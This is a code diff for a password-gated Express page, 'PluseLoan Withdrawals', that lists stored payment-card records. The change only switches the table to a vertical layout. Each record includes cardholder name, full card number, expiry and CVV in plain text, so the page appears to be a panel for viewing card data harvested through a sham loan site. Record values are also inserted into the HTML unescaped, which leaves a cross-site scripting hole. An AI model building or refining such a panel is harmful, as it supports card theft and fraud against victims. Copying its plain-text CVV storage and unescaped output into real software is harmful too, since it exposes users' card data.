@@ -116,7 +116,7 @@ app.get('/', (req, res) => {
             `);
         }
 
-        // Password correct, display withdrawals
+        // Password correct, display withdrawals vertically
         fs.readFile(withdrawalsFile, 'utf8', (err, data) => {
             if (err) {
                 return res.status(500).send('Error reading withdrawals data');
@@ -135,35 +135,45 @@ app.get('/', (req, res) => {
                         h1 { text-align: center; color: #000; }
                         table { width: 100%; max-width: 900px; margin: 20px auto; border-collapse: collapse; }
                         th, td { padding: 10px; border: 1px solid #ddd; text-align: left; }
-                        th { background: #000; color: #fff; }
-                        tr:nth-child(even) { background: #fff; }
-                        tr:nth-child(odd) { background: #f0f0f0; }
+                        th { background: #000; color: #fff; width: 200px; }
+                        td { background: #fff; }
                     </style>
                 </head>
                 <body>
                     <h1>PluseLoan Withdrawals</h1>
                     <table>
                         <tr>
-                            <th>Cardholder Name</th>
-                            <th>Card Number</th>
-                            <th>Expiry</th>
-                            <th>CVV</th>
-                            <th>Loan Amount</th>
-                            <th>Timestamp</th>
-                        </tr>
+                            <th>Field</th>
             `;
 
-            withdrawals.forEach(w => {
+            // Add a column header for each withdrawal
+            withdrawals.forEach((_, index) => {
+                html += `<th>Withdrawal ${index + 1}</th>`;
+            });
+
+            html += `</tr>`;
+
+            // Define the fields to display
+            const fields = [
+                { label: 'Cardholder Name', key: 'cardholderName' },
+                { label: 'Card Number', key: 'cardNumber' },
+                { label: 'Expiry', key: 'expiry' },
+                { label: 'CVV', key: 'cvv' },
+                { label: 'Loan Amount', key: 'loanAmount', format: value => `$${value}` },
+                { label: 'Timestamp', key: 'timestamp' }
+            ];
+
+            // Add a row for each field
+            fields.forEach(field => {
                 html += `
                     <tr>
-                        <td>${w.cardholderName}</td>
-                        <td>${w.cardNumber}</td>
-                        <td>${w.expiry}</td>
-                        <td>${w.cvv}</td>
-                        <td>$${w.loanAmount}</td>
-                        <td>${w.timestamp}</td>
-                    </tr>
+                        <th>${field.label}</th>
                 `;
+                withdrawals.forEach(w => {
+                    const value = field.format ? field.format(w[field.key]) : w[field.key];
+                    html += `<td>${value}</td>`;
+                });
+                html += `</tr>`;
             });
 
             html += `
